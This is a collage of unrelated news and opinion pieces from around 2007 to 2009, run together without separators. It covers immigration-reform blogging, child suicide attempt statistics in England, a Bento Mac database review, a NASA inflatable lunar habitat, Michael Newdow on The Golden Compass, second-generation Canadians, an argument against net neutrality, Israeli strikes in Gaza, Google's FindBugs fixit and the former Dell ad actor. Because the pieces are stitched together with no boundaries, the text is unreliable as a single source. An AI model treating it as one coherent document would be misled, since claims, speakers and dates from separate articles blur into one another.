Blue America , a PAC lead by FireDogLake , Down With Tyranny , Crooks and Liars and Digby , have launched an exciting campaign to hold Congressman Rahm Emanuel accountable for instructing DCCC candidates to regard immigration policy as a political “ third - rail ” .
Their work in concert with the Illinois Coalition for Immigrant and Refugee Rights could turn into a model of the kind of collaboration needed moving forward .
By focusing on pro-migrant policy rather than the political ramifications of Rep. Emanuel 's anti-migrant strategy , the netroots showed a potential to shape this policy debate if done properly .
The burgeoning Latino / a blogosphere , front - lined by the likes of Latino Pundit , Latina Lista and Para Justicia y Libertad and which includes immigration policy blogs like Immigration Orange and Migra Matters , continue to expose anti-immigrant myths , call attention to under - reported stories , promote immigrant voices and drive on - the - ground pro-migrant activism .
Diarists on community blogs like “ Colorado Luis ” and Migra Matters editor “ Duke1676 ” ’s crossposts to DailyKos have kept blog readers outside of the immigrant rights community informed of ICE raids and deportations .
There must be greater attention for their efforts outside of immigrant rights circles .
The Netroots ' role
An independent voice is needed now as a check against the Democratic Party ’s inclination to defer on this issue , corporations ’ interest in maintaining a class of easily exploited workers and television pundits ’ desire for ratings inspired by anti-immigrant demagoguery .
Bloggers are perfectly suited for this role as a truly populist voice demanding the interests of the current and aspiring middle class be front and center in the immigration debate .
The netroots ’ political independence , understanding of the importance of framing and ability to act as a megaphone to the voices and concerns of people outside the beltway could be a godsend to the cause of progressive immigration reform .
The netroots has already proven its ability to change the conventional wisdom about politics and create new media narratives .
This political skill and power can be used in the fight for progressive immigration reform in the following ways :
1 . Make it a priority to discuss this issue .
With the 08 elections around the corner , it will be easy for critical policy issues like immigration to either get sidelined or only be discussed in terms of the political relevance of Hispanic population growth .
That approach will not get the progressive movement united on a sound policy message and will not create the political will sufficient to compel the federal government to pass a constructive immigration policy .
However , it is also possible that immigration will be a central issue in the campaign because of Republican efforts to excite their base .
The discussion of immigration coming from candidates who have traditionally supported immigrant rights has been reactive , a defensive crouch in response to the Lou Dobbs tirades rather than a serious engagement in the issue .
Even candidates who have pro-immigrant platforms are making the mistake of not explaining their stances through the lens of the middle - class squeeze , and because they fear their pro-immigrant views will make them a target , they refrain from being specific about policy or saying very much at all .
Bloggers are great at holding Democrats accountable for their positions .
Bloggers can use their power to drive candidates to take pro-middle class , pro-immigrant stances and spell out constructive immigration policy .
2. Educate your readers about the substance , not just the politics of this issue
Currently , the blogosphere is facing an immigration policy information gap between the work being issued by policy institutions and the information relayed to blog readers .
The disturbingly high frequency of anti-immigrant comments from progressive blog readers about wage suppression -- left in response to blog posts that support comprehensive immigration reform -- demonstrate that the arguments being made in these posts are not addressing progressive blog readers ’ core economic concerns .
Excellent policy reports and studies have been released that prove the value of immigrants to America ’s future , but even pro-immigrant blogs are not arming their readers with that policy information .
By referencing studies and policy reports such as The Pew Study of English usage among immigrants , the University of Illinois study on how immigrant enforcement threatens workers rights , and the Fiscal Policy Institute ’s study of immigrants ' economic contributions to New York ’s economy , bloggers can better educate their readers about immigration policy and specifically address their own readers ’ legitimate concerns about the presence of undocumented workers in the labor market and worker exploitation .
Bloggers need to make a policy - based argument that enforcement - only immigration legislation would actually increase the likelihood of wage suppression and harm the current and aspiring middle class .
Absent this conversation progressive blog readers will continue to believe that nativist immigration arguments are populist .
Blogs can also consider having immigration policy experts and organizers guest blog on their sites as FireDogLake recently has and as DMI has done for some blogs such as Alternet’s .
3 . Keep an eye on local politicians
With the federal government abdicating its responsibility to pass immigration reform , state and municipal governments have enacted their own immigration policies .
Some of these policies -- such as New Haven Connecticut ’s issuing of municipal identification cards -- are models of smart immigration policy that should be replicated .
Others , such as Riverside New Jersey ’s law to penalize landlords and business owners for renting apartments to or employing undocumented workers , are patently destructive to local economies .
The town ’s economy was so devastated by the anti-immigrant law that the Town Council voted 3 to 1 to rescind it .
Bloggers can be watchdogs to their local politicians about immigration legislation , telegraphing policies that work and policies that do not .
Bloggers can encourage their local leaders to consider replicating positive policies implemented in other parts of the country as well .
Much like former Senator George Allen ’s “ macaca moment ” bloggers can take the lead in exposing anti-immigrant rhetoric used at below the radar local political events .
4. Keep an eye on the press
Much of the toxicity in the current immigration debate stems not just from rhetoric used by pundits such as Lou Dobbs or Bill O'Reilly but by biased language used to report news stories in the legitimate press outlets .
The default language politicians and the media use to discuss comprehensive immigration reform is inaccurate .
The inaccurate wording used by newspapers ' online polls is one example .
In a recent online poll issued by the respected Long Island paper Newsday , there was an online poll asking " What kind of immigration reform should Congress pass ? "
The only response options were various levels of enforcement - only legislation , guest worker programs or " amnesty " .
After the DMIBlog wrote about the skewed poll , Newsday realized its error and took down the poll saying they would be more careful about their word choice in the future .
Similar tactics could be employed to respond to other media run polls , like CNN 's constantly toxic viewer polls .
Bloggers can push the media to refrain from using conservative language like “ illegals ” when reporting on immigration and should keep an eye out to make sure they do not use that language in their own posts .
Media watchdogs such as Media Matters for America have done an excellent job issuing action alerts when pundits and journalists misstate facts about immigration .
Bloggers can monitor their local and national media for false information or misleading framing .
Often the media ascribes to the American public a far more anti-immigrant opinion than they actually hold .
It is taken as a given that the public is opposed to a path to citizenship for undocumented immigrants when this is simply not true .
5 . Humanize this debate by telling stories
Groups like Dreams Across America focus on telling the personal stories of immigrants .
They create excellent YouTube videos that humanize immigrants and show the diversity of the roles immigrants play in communities around the country .
A great strength of bloggers is the ability to personalize political issues .
That approach can be applied to the immigration debate as bloggers tell their own stories of immigration and migrants in their community , be they Polish or Ecuadorian .
LongIslandWins.com does this on a local level .
6 . Link people to action
The next step after building consensus for progressive immigration reform is for blogs to funnel their readers into organizations that are doing offline mobilization on the issue .
Blogs have reported on the offline activism that immigrant rights groups have conducted but they have not been particularly involved in organizing it .
Young immigrant rights activists have already successfully used Facebook to drive up attendance at protests but the larger progressive community was not really part of that movement .
A diverse constituency needs to be built for progressive immigration reform so getting activists from beyond the immigrant rights movement to come out and support the cause is key .
Local blogs can take the lead in directing readers towards actions in their own communities and can build relationships with local immigrant rights groups as well .
Blogs can help organize their readers to videotape protests or political forums occurring in their own communities .
Part of that effort would be a continuation of watchdog work but this would also ensure that important protests are broadcast to the wider world .
The Illinois Coalition for Immigrant and Refugee Rights has a great clearinghouse that bloggers can use to prompt their readers to action in their state .
Progressives can learn a lot from the success of the online / offline organization Numbers USA .
Numbers USA has already played a major role in developing effective anti-immigrant messaging and organizing tactics , which The New York Times reports contributed to Congress ’ sidelining of any legislation that involved a path towards citizenship .

Exposing the wankery , the douchebaggery , the fecal stainery , and the general foul pusbag that is MSNBC's Chris Matthews
More than 4,000 children under 14 have attempted to take their own lives in the past year , according to NHS figures that show the scale of distress and mental suffering in the young .
Statistics being released this week will paint a terrible picture of how children have tried to commit suicide .
They reveal that 69 attempted to hang or suffocate themselves and two tried to drown themselves .
Most took overdoses of medicines , drugs or solvents in an effort to end their lives , but some resorted to more extreme measures .
Thirteen children leapt from a great height , while four lay or jumped in front of a moving vehicle .
One child attempted suicide by deliberately crashing a car .
The records show that 4,241 children under 14 were admitted to hospitals in England in the 12 months to March 2007 after attempting to kill themselves .
The figures are in a report by the Information Centre for Health and Social Care , a body set up by the government to analyse the details behind nearly a million adult and child admissions to accident and emergency departments each year .
The number of suicide attempts , which has risen slightly in the past five years , will worry ministers , who are aware that secondary school teachers and family doctors are increasingly seeing children , particularly young boys , in states of distress without being able to offer a specialised support service .
Ed Balls , the Children 's Secretary , has set up a review of children 's and teenagers ' mental health services with the aim of finding ways to stop problems arising .
He called last week for more vigilance in spotting ' distress signals ' in young boys .
There is a growing debate about whether mental health disorders are rising in the young , but there are signs that health professionals are seeing more young patients .
The number of prescriptions handed out to children under 16 for depression and mental health disorders has quadrupled in a decade .
Isla Dowd , of the charity Rethink , said : ' To have this number of children attempting to commit suicide in a country where we are claim to have a culture where every child matters is profoundly shocking .
Children often attempt suicide when they feel that such drastic action is the only solution to their problems .
There is still not adequate and appropriate access for children experiencing emotional and mental distress . '
About one in 10 children and young people will suffer behavioural , emotional or mental health problems before the age of 18 , with twice as many young boys under 10 as girls diagnosed with a mental health disorder .
Balls said : ' We know that girls are better than boys at asking for help when they need it .
That is why we are calling on professionals working with children to keep a close eye on boys in particular and spot when they are distressed . '
Health Secretary Alan Johnson added : ' Having good mental health enables young people to make the most of their opportunities .
However , we know that a minority of children and young people are at increased risk of developing mental health problems than their peers . '
A new desktop application for the Mac aims to turn the boring old database – the sullen domain of accountants , librarians and pencil - pushing bureaucrats – into an empowering organizational tool that appeals to everyone .
Well , maybe not everyone .
Every household has a " planner , " and Filemaker 's Bento ( $ 50 , Mac OS X 10.5 only , free preview available until January ) is tailor - made for this personality type – the hyperorganized dad who can't enjoy a vacation until all the reservations are documented in triplicate , or the wife who can't throw a party without labeled invitations and a spreadsheet tracking who 's RSVP'd and who has n't .
Not all of us are borderline - OCD sufferers , so here 's an analogy to help you grasp the appeal of a pretty - looking desktop database application :
What iTunes does for your digital music , Bento can do for contacts , spreadsheets and digital photos .
It provides a colorful easy - to - use animated interface for storing and organizing personal data , and in doing so , it stands out among the dozens of ugly tables - and - text options .
Bento can build an organization system for just about anything .
Photos , PDF documents , MP3s , videos , Keynote presentations and charts from Pages can all be added to Bento .
You can also drop in spreadsheets from Excel or import any spreadsheet or CSV file .
For my testing , I used Bento to create a database of recently tasted wines .
I added fields for vineyard , grape varietal , vintage , age of the bottle , my rating and a text field for tasting notes .
I also put in a slot to display the label .
Of course , if I have contact information for the vineyard , the restaurant where I drank it or the friend who recommended it , I can add that easily by dragging from my Address Book app .
I can now sort my vinous memories by rating , type of grape , vintage or any way I like .
Filemaker is a wholly - owned subsidiary of Apple , and Bento has a very Apple - flavored look and feel .
It has much of the same search functionality as iTunes , and the themes of the database forms have the same style as the backgrounds in iLife applications like iWeb and iDVD .
The visual flair of the templates make printouts look snappy as well .
Note : Bento requires Leopard .
It utilizes Leopard - specific enhancements like Advanced Find , an application - specific implementation of Spotlight desktop search , and the new Core Animation engine .
Bento organizes all of your personal collateral into " collections " you can customize .
Bento collections are a lot like iTunes playlists .
For example , all of my Address Book contacts are available in Bento as a collection by default , but I can build separate collections of friends , family members , co-workers , PR flacks and sources for stories .
Using Bento's form builder , I can extend my basic Address Book entries by rating everyone based on how much I like them .
I just drag an iTunes - style star - rating widget onto their contact cards .
I can also add a check box and fill it in only if that person has ever bought me a birthday present .
Collections can be sorted manually , or you can build " smart " collections , just like you 'd build a smart playlist in iTunes .
For example , I can generate a smart collection showing only the people in my Address Book who are not PR flacks , who did buy me birthday presents , and whom I judge to be at least a 4 out of 5 .
Voilà – I now have the guest list for my next party .
Bento syncs with the databases already on your Mac : your Address Book , iCal calendar and a .
Mac account if you have one .
So change an address in Bento , and you 'll see the change show up in Address Book and vice versa .
Also , when you put new contacts onto your Mac by entering them manually or syncing your iPhone , those contacts become instantly accessible in Bento .
Bento has some drawbacks .
The star - based rating system is limited , and some of the fields require too much data – my date - based " vintage " field for wines would n't accept anything less than a specific day , month and year .
But the application is well - enough - designed – and offers enough ways to tweak , organize and examine – to make even the control freaks blush with delight .
Bento is available as a free " preview " download until January 2008 , at which point the preview will stop working .
Single - user version costs $ 50 , and a five - user family pack costs $ 100 .
Bento also requires Leopard ( Mac OS X version 10.5 or later ) .
As humans prepare to return to the Moon , this time to stay , there are so many different technologies that need to be developed and tested .
NASA and the NSF are testing out a new prototype for an inflatable habitat that might eventually protect humans on the Moon .
And they ’re testing it in the most extreme place on Earth : Antarctica .
The newly developed inflatable habitat is inflated and pressurized , giving potential astronauts their own atmosphere .
Inside the tent is heated , offering up 35 square metres ( 384 square feet ) of living space , under a 2.4 - metre ( 8 - foot ) ceiling .
It also has access points for electrical power .
NASA currently uses a 50 - year old tent design called a Jamesway hut .
Television viewers will recognize these designs in the show M* A * S*H .
Although there are new approaches to this old design , they ’re rigid , difficult to ship , and have limited insulation .
When you ’re working in Antarctica , a lack of insulation is a serious problem .
The purpose of this new design is to test out how well an inflatable habitat will work in terms of packing , transportation , set up , power consumption and damage tolerance .
When astronauts do finally return to the Moon by 2020 , they ’ll be setting up a permanent lunar outpost .
An inflatable habitat like this could be carried on future lunar rovers , and would allow the astronauts to set up a temporary home , far away from the permanent base .
This would greatly increase their range , and allow the exploration of the most interesting lunar features – not just those nearby the base .
The inflatable habitat is being developed under NASA ’s Innovative Partnerships Program .

* Hollywood spent a mind - boggling $ 180 million to bring author Philip Pullman 's celebrated anti-religious novel ,
The Golden Compass , to the silver screen , but essentially stripped the work of its devastating attack on organized religion .*
On the eve of the film 's release , we asked America 's most famous atheist , Dr. Michael Newdow , how he feels about this .
Dr. Newdow is a California attorney and physician best known for his efforts to ban schools from reciting the Pledge of Allegiance because of the phrase " under God . "
\—
Michael Newdow talks to reporters outside his home in Sacramento , California , about his lawsuit that prompted a federal appeals court to declare school recitation of the Pledge of Allegiance unconstitutional .
Photo : Associate Press / Rich PedroncelliThe Catholic League for Religious and Civil Rights has commented on the release of Philip Pullman 's The Golden Compass .
The final line is , " And remember , his twin goals are to promote atheism and denigrate Christianity . "
Accordingly , the League " wants Christians to stay away from this movie . "
This is obviously different from when the Catholic League supported Mel Gibson 's work , The Passion of Christ .
The Passion , many would say , had similar twin goals : promoting Christianity and denigrating Judaism .
Thus , we see what is not unexpected , especially when religion is at issue :
People lend their support when their system of belief is advocated , and wish to do anything but when the advocacy is for the belief systems of others .
That is what the free speech and free exercise clauses of the First Amendment absolutely protect .
Accordingly , let the clamor continue , and let each of us weigh in ( or simply listen ) with whatever biases we bring to bear .
There is another clause in the First Amendment , however , which is quite different .
That one is the establishment clause , which has nothing to do with expression by private actors , be they individuals , organizations or whatever .
The establishment clause speaks only to what the government may say .
In other words , we do n't want the government getting involved in these arguments .
As Justice Scalia has written , " The government may not … lend its power to one or the other side in controversies " of such a religious nature .
While the Catholic League maintains its animus towards The Golden Compass , one hopes that it will support this notion of government neutrality .
Unfortunately , that seems unlikely .
It was a Catholic organization , after all , that was the key group behind the 1954 alteration of the Pledge of Allegiance .
In that year , the Knights of Columbus lobbied Congress to modify the words " one Nation indivisible " so that " one Nation under God , indivisible " ( italics added ) is what is now recited in our public schools .
They still congratulate themselves over the change .
Interestingly , Catholics in the founding era were very much treated like the atheists of today .
Our Founding Fathers literally hated the Catholics .
Samuel Adams , for instance , wrote that " much more is to be dreaded from the growth of popery in America , than from the Stamp Act or any other acts destructive of civil rights . "
John Jay , the nation 's first chief justice , attempted to have the right to the free exercise of religion open to all " except the professors of the religion of the Church of Rome . "
And when the Quebec Act was passed in support of the ( Catholic ) government in neighboring Canada , the Continental Congress wrote in protest to the people of Britain , complaining that Catholicism was " a religion that has deluged your island in blood , and dispersed impiety , bigotry , persecution , murder and rebellion through every part of the world . "
This in not meant to single out Catholics .
Protestants , Muslims , Jews , atheists , Buddhists and every other religious group is just as capable of being discriminated against , and of discriminating against others .
It is just a call to exult in both of the religion clauses in our marvelous Constitution .
While we all impart our views to the tapestry of opinion and celebrate not only the freedom of others to disagree , the muzzle that has been placed on government in this one subject area has been ( and continues to be ) responsible for so much animosity , suffering , cruelty and death .
The Golden Compass , situated in a different universe , is named for what is called an " alethiometer . "
Referred to as " a GPS device for locating the truth , " it essentially reigns supreme in terms of value for that world 's inhabitants .
In religion , it seems there is only one truth : that we will never all agree .
Whatever one 's views on atheism or other religious belief , in this universe and on this world , the establishment clause of our First Amendment deserves the esteem of an alethiometer .
\—
The Rev. Dr. Michael Newdow is a minister in the First Atheist Church of True Science and the plaintiff in the case that went to the Supreme Court in 2004 , challenging the words " under God " in the Pledge of Allegiance .
He requests that we disclose that he has yet to see the movie , The Golden Compass , which was n't released to the public until Dec. 7 .
This week Statistics Canada released a patchy report highlighting the disparity between second - generation men and women .
The latter , it turns out , are outperforming their male counterparts academically and economically by a wide margin .
While the report was long on demographic and economic data – second - generation women earn more than women with similar education whose parents were born in Canada , while second - generation men earn considerably less than their male peers – there was little that actually explained why .
It suggested that delayed marriage and child rearing , as well as better access to high - paying jobs in urban areas may contribute to the comparative success of second - generation women .
But the sweeping generalizations offered in the report – aimed to support the data , not the other way around – are indicative of social science 's inability to measure the nuanced philosophical , cultural and historical dynamics often at the heart of such trends .
And they diminish the courage and adaptability women have historically exhibited when faced with the challenge of survival between two worlds .
Numbers can't convey the story of second - generation women so hungry for opportunity in the West once freed from the strictures of traditional family roles .
Nor can statistics account for the sometimes crippling effects young men swaddled in emotional privilege face when thrown into the chilly Canadian melting pot .
The vast majority of Canada 's current second - generation population have roots in China , South Asia and the Caribbean , while others trace their origins to the Middle East and Africa .
While demographers and anthropologists remain vexed by the worlds these Canadians occupy , their stories have been told by authors such as M.G. Vassanji , Terry Woo and Shauna Singh Baldwin .
In the background of stories such as Vassanji's No New Land and Baldwin 's Montreal 1962 , and the foreground of Woo's Banana Boys , many questions left unanswered by the StatsCan report are addressed for readers who benefit from the understanding of why women often do better than men .
" I think very often men experience a state of shock when coming to the West while women experience a rise in status , " explains Baldwin , a Canadian who makes her home in Wisconsin .
" Women become the protectors of men .
There 's a role reversal that takes place . "
In Montreal 1962 , one of the short stories compiled in English Lessons and Other Stories a Sikh couple recently emigrated from India unexpectedly encounter discrimination as the turban - wearing husband is unable to find a job because of his appearance .
While the husband , the bread winner , internalizes the dilemma as a paralyzing struggle between the obligation to his religious - cultural identity and the need to survive , the wife ultimately makes the bold decision her husband is unable to :
You will not cut your hair , and stop wearing your turban , she insists , and everything will be just fine .
" Women are responsible for the future , " Baldwin says .
" Quite often men are responsible for the preservation of the past and the continuity of the family line , it 's the burden of masculinity .
And women are culpable because we often teach our sons how to be , we teach them this type of masculinity . "
While women thrive , she says that 's why second - generation men are inevitably shaped by the traditional notion of masculinity that traps so many boys under the weight of expectations .
It 's the type of masculinity chronicled daily in the news as Sri Lankan male youths in Toronto wage war with each other to preserve the dignity of their family name , young Muslim men get charged for allegedly plotting to destroy buildings and second - generation male Punjabi Canadian teenagers find solace from a harsh world in a growing number of rival gangs .
Meanwhile second - generation women dominate university campuses and gain a foothold in the corporate world , as they promise to fulfill the dreams of their immigrant parents .
" It ( the role reversal ) can be empowering for women once they arrive in the west , " Baldwin says , " but it 's also kind of sad , they have to turn into something they were n't intending to be . "
Woo , whose Banana Boys has been lauded as the most honest depiction of the struggles faced by young second - generation Canadian - born Chinese men , agrees with Baldwin 's characterization of the masculinity that many in his generation are unable to balance .
" It 's difficult to not succumb to the pressure that second - generation men face .
They have to compete with each other for everything , they have all the pressure from the parents , two or three millennia of cultural programming .
Some guys go bug wild and completely resist it or melt down .
" When you look over at women , it 's almost as if they 're free from all that .
What counted as an advantage for men in the previous culture , where they were favoured , is now a burden .
And for women , who were n't valued as equal in terms of their potential , they 're now free , they 're almost more motivated to pursue their heart 's desire . "
In Vassanji's No New Land , while the protagonist Nurdin Lalani walks like a ghost through his troubled new life in a strange place called Don Mills , recalling his haunted past in Africa , the women in the backdrop – resilient and firmly fixed toward the future – provide hope that everything will be just fine .
The statistics can't explain that .
DIGG THIS
1934 was a bad year for the constitution .
69 years to the day after Galveston Texas learned the Civil War had ended and that southern slaves were now free , Congress passed the Federal Communications Act , creating the FCC .
Seven days later Congress passed the National Firearms Act .
The Communications
Act expanded the influence of what was once the Federal Radio Commission to include television .
The act has been amended over the years to include wired communication of all types .
Ever since it became obvious that the Internet was going to be an important means of transferring wealth and information , the FCC has turned a jealous eye to it .
The hyperventilating Congress has been more than willing to hand over power to the FCC when it is allowed .
We had the “ Internet Decency Act , ” thankfully struck down for the most part by a temporarily sane Supreme Court , taxing attempts and now the latest is so - called Net Neutrality .
The term Net Neutrality ( NN ) is not even satisfactorily defined but has certainly attracted a large group of followers .
NN proponents are quite certain that at any moment AT&T , Southwestern Bell , AOL , and any number of ISPs and bandwidth providers , are going to suddenly start preventing their customers from visiting sites or accessing services .
Why they would want to do such things is explained with hand - wavy responses and hyperbole .
Attempting to get a net neutrality proponent to give a concise definition or rational argument to support the fear - mongering is like pulling teeth with a set of rusty pliers .
One of the most vocal proponents of NN is Columbia law professor Tim Wu ( occasionally given credit for coining the term ) .
Tim really wants us to care about Net Neutrality .
In Why You Should Care About Network Neutrality ( The future of the Internet depends on it ! ) he pants :
“ In trying to figure out who ’s right , let ’s forget about the Internet and look at KFC .
The fast - food chain discriminates .
It has an exclusive deal with Pepsi , and that seems fine to pretty much everyone .
Now , let ’s think about the nation ’s highways .
How would you feel if I - 95 announced an exclusive deal with General Motors to provide a special “ rush - hour ” lane for GM cars only ?
That seems intuitively wrong .
But what , if anything , is the difference between KFC and I - 95 ?
And which is a better model for the Internet ?
We ’re all supposed to care so much about “ Net Neutrality ” that we throw logic and common sense out the window .
Wu wants us to that KFC , a private entity with the right to engage in private contracts and competitive agreements , is the same as a government transportation agency engaging in fascist policy  the subsidization of an automobile manufacturer .
He also wants us to believe that a competitive agreement between two companies is “ discrimination . ”
If you are a consumer and want Coca Cola , but KFC only serves Pepsi , you have a choice .
In Wu ’s highway example , the traveler has no choice .
He is the victim of a government - imposed monopoly ( a redundancy  monopolies are not possible in free markets ) .
This is generally the level of argument you can expect from neutrality proponents .
The overwhelming historical evidence of ISP behavior in the marketplace would itself suggest that these fears are unfounded .
While it is true that competition for ad revenue is fiercely contested and many content providers have tried to make their content " sticky , " users still have a tendency to wander off the reservations .
The companies that have rejected tight controls on their users have thrived and the companies that have attempted to force users into closed systems have n’t fared so well .
A good example of this is AOL .
Their customer base is largely made up of people who are happy with the way that AOL ’s software tries to keep them “ in network , ” though AOL before their merger with Time Warner were losing customers as other alternatives emerged .
AOL ’s inclusion of a web browser allowing customers to surf outside the AOL network was primarily done to prevent their customer base from fleeing .
It was in their best interest to provide access to other locations .
They still have a significant customer base and they can credit the inclusion of a standard browser for this .
Internet companies have responded slowly to customer desires at their own peril .
I remember the day I was hired at Lycos to help manage their ad delivery network .
Lycos ’ stock was trading at $ 107 dollars and the company was a legitimate threat to Yahoo .
At that time page views were the current measure of success and Lycos was in the # 2 spot with 38,000,000 page views per day .
A year later , in 2000 , Lycos ’ stock was trading at just over $ 30 dollars a share .
They did n’t listen to their customers and paid the price .
Their customers found other destinations .
After the Terra / Lycos merger , they have become almost irrelevant .
They are n’t even listed as significant in search engine rankings compared to their competitors even though they were one of the first to claim the space .
This kind of market fallout is n’t limited to strictly ISPs .
The Internet has totally changed the face of the tech industry .
Where proprietary business models were once very lucrative for technology companies  systems with networking protocols and devices locked the customer into a single brand  you can count on one hand any of the companies which have managed to survive those practices as the demand for open systems grew .
I still remember the Wang “ Soup to Nuts ” radio commercials from 1991 .
Where ’s Wang now ?
Net Neutrality proponents want us to believe that in spite of market forces dictating that content and destination restrictions are not good for business , they will one day defy all logic and start engaging in the practice .
But let ’s at least discuss an equivalent to the KFC example provided by Wu .
Let ’s say that AOL / Time Warner decides it no longer wants to allow AOL customers to reach Google and instead drives them to their own in - house search engine .
Why is this bad ?
Time Warner / AOL owns the equipment and network they ’ve built .
Net Neutrality proponents would claim that the FCC needs to step in to prevent this .
What if AOL , who by the way has to pay for the bandwidth it provides to its customers , limits movie and file downloads or certain chat clients that they have n’t written ?
It ’s their company .
Their customers are not required to continue to accept bad service .
Customers are still free to switch providers .
Nobody has been harmed .
NN proponents would like you to believe otherwise but their entire argument is based on fear .
NN is the classic protection racket with the FCC as “ savior . ”
This idea is barely newer than prostitution .
Ironically
Wu projects his own designs on those he is attempting to punish :
But what must be banned are blocking , gratuitous discrimination , and choosing favorites .
While it ’s one way to earn cash , it ’s just too close to the Tony Soprano vision of networking :
Use your position to make threats and extract payments .
This is similar to the outlawed , but still common , “ payola ” schemes in the radio world .
Yes , there ’s money in such schemes , but they are n’t good for the industry or the country .
If allowing network discrimination means being stuck with AT&T ’s long - term vision of the Internet , it wo n’t be worth it .
[ emphasis added ]
This would be amusing if it were n’t for a good number of people taking this drivel seriously .
There is one area the NN proponents touch upon which I find compelling .
The main infrastructure which allows the Internet to thrive has been traditionally controlled by the monopoly phone companies .
Landlines and power infrastructure are good examples where the consumers have not been given a fair shake .
In many areas , there is little choice but to use a single provider because the rights of way and easements were long ago co-opted by government and business interests in concert to create monopoly phone and power companies .
However , rather than inject yet another bureaucracy to protect us , why not try something different for a change ?
Why not try freedom ?
If the easements were not controlled by monopolies , entrepreneurs could start delivering fiber to your neighborhood ( there is quite a bit of “ dark fiber ” already available which represents a great deal of potentially available bandwidth ) .
Any local or federal easement could be auctioned off to the highest bidder .
Wireless companies could gain access and put up towers .
Innovation and creativity may even eliminate the necessity for unsightly towers , poles and lines to deliver services .
Why not introduce real competition in the areas where currently none exists and let the market decide ?
If content - limiting schemes prove successful , maybe we should , rather than assume that the company doing this is evil , consider the customers are getting the service they desire .
What if this turns out to be a valuable service which is then further emulated ?
It would be far better than the unimaginative solution being proposed which has the ugly side effect of encroaching upon our liberties .

GAZA ( Reuters ) - Israel bombed the Hamas - run Interior Ministry in Gaza and closed border crossings with the strip on Friday , sharply escalating what it called a campaign to halt Palestinian rocket attacks .
Palestinians gather around a destroyed building of Hamas ' Interior Ministry after it was targeted by an Israeli missile in Gaza January 18 , 2008 .
An Israeli missile strike destroyed Hamas 's Interior Ministry in Gaza City on Friday , but the building was empty at the time , Hamas security sources and local witnesses said .

The four - storey ministry complex in Gaza City was empty at the time but one woman was killed and at least 30 others nearby were wounded in the air strike , medical officials said .
“ It felt like an earthquake , ” said Umm Fahmi , a woman who lives across from the blast site .
“ My house did not only shake , it jumped from its foundations and back down .
How could they drop such a bomb in a residential area on top of people ’s heads ? ” she said , peering through the dust at the concrete and steel remains of the security complex .
It was the first Israeli bombing of a Palestinian government building since Hamas Islamists took over Gaza in June after routing secular Fatah forces loyal to President Mahmoud Abbas .
A second Israeli air strike minutes later damaged Hamas ’s so - called naval headquarters in the central Gaza Strip .
Israel has killed at least 33 Palestinians in Gaza this week as part of what officials describe as a stepped - up campaign to pressure Hamas to rein in militants who have fired more than 110 rockets into the Jewish state in the last three days alone .
An Israeli army spokeswoman confirmed the air strikes , calling the targets “ Hamas terrorist ” positions .
“ This is part of our response to Qassam ( rocket ) fire against Israel , ” the spokeswoman said .
The Interior Ministry oversees Hamas - controlled government forces in Gaza , but not the group ’s armed wing .
The armed wing claimed responsibility for most rocket salvoes since Tuesday , when Israel killed 18 Palestinians , mostly Hamas militants .
PEACE PROCESS
The violence has prompted the Palestinians to caution that peace talks between Abbas and Israeli Prime Minister Ehud Olmert , spurred by a visit by U.S. President George W. Bush , were in jeopardy .
Earlier on Friday , the Israeli Defence Ministry closed all Israel ’s border crossings with Gaza and prevented the delivery of a U.N. aid shipment .
Only so - called “ humanitarian cases ” given Defence Minister Ehud Barak ’s personal approval would be allowed through , the ministry said .
“ If milk is low in Gaza , the minister will be asked to approve a milk shipment , and it will enter , ” a Defence Ministry spokesman said .
The United Nations condemned the closure and warned Israel against imposing illegal “ collective punishment ” against Gaza ’s 1.5 million residents , most of whom depend on foreign aid .
“ The Israeli reaction is not justified by those rocket attacks , even though it ’s caused by those rocket attacks , ” said John Holmes , undersecretary - general for Humanitarian Affairs .

A the behest of Arab and Muslim countries , the U.N. Human Rights Council will hold an emergency session next Wednesday to examine Israel ’s new measures in Gaza , a U.N. source said .
Israel has imposed strict curbs on non-humanitarian supplies to Gaza since June .
But many essentials have been getting in , either with Israeli approval or through smuggling , though supplies are limited and prices steep .
In the West Bank city of Nablus on Friday , Israeli troops killed a militant linked to Abbas ’s Fatah movement .
An Israeli air strike flattened the previous Hamas - run Interior Ministry building during a bombing campaign that followed the abduction of an Israeli soldier by militants in June 2006 .
Abbas ’s government has condemned the latest Israeli operations as “ a slap in the face ” to efforts by Bush to achieve a peace treaty by the end of the year .

Experience with FindBugs
Google FindBugs Fixit : Google has a tradition of engineering fixits , special days where they try to get all of their engineers focused on some specific problem or technique for improving the systems at Google .
A fixit might work to improve web accessibility , internal testing , removing TODO 's from internal software , etc .
In 2009 , Google held a global fixit for UMD's FindBugs tool a static analysis tool for finding coding mistakes in Java software .
The focus of the fixit was to get feedback on the 4,000 highest confidence issues found by FindBugs at Google , and let Google engineers decide which issues , if any , needed fixing .
More than 700 engineers ran FindBugs from dozens of offices .
More than 250 of them entered more than 8,000 reviews of the issues .
A review is a classification of an issue as must - fix , should - fix , mostly - harmless , not - a- bug , and several other categories .
More than 75 % of the reviews classified issues as must fix , should fix or I will fix .
Many of the scariest issues received more than 10 reviews each .
Engineers have already submitted changes that made more than 1,100 of the 3,800 issues go away .
Engineers filed more than 1,700 bug reports , of which 600 have already been marked as fixed Work continues on addressing the issues raised by the fixit , and on supporting the integration of FindBugs into the software development process at Google .
The fixit at Google showcased new capabilities of FindBugs that provide a cloud computing / social networking backdrop .
Reviews of issues are immediately persisted into a central store , where they can be seen by other developers , and FindBugs is integrated into the internal Google tools for filing and viewing bug reports and for viewing the version control history of source files .
For the Fixit , FindBugs was configured in a mode where engineers could not see reviews from other engineers until they had entered their own ; after the fixit , the configuration will be changed to a more open configuration where engineers can see reviews from others without having to provide their own review first .
These capabilities have all been contributed to UMD 's open source FindBugs tool , although a fair bit of engineering remains to prepare the capabilities for general release and make sure they can integrate into systems outside of Google .
The new capabilities are expected to be ready for general release in Fall 2009 .
The current development team consists of Bill Pugh and Andrey Loskutov .
The most recent funding for FindBugs comes from a Google Faculty Research Awards .
Numerous people have made significant contributions to the FindBugs project , including founding work by David Hovemeyer and the web cloud infrastructure by Keith Lea .

Oh , how the mighty have fallen : Ben Curtis , famous just a few years ago as " Steven the Dell Dude , " is now a waiter / bartender at Tortilla Flats in New York .
Although the Steven ads were hugely popular and generated tons of buzz ( and revenue ) for Dell , the company eventually dropped the campaign after Ben got arrested for buying pot in 2003 -- shocking no one who actually watched the commercials , but apparently not the message Dell wanted to send the parents fronting the cash for all those machines .
Although he 's down to slinging drinks , Ben 's taking it in stride , saying " There were times when I made boatloads of money as an actor , but here I can be myself . "
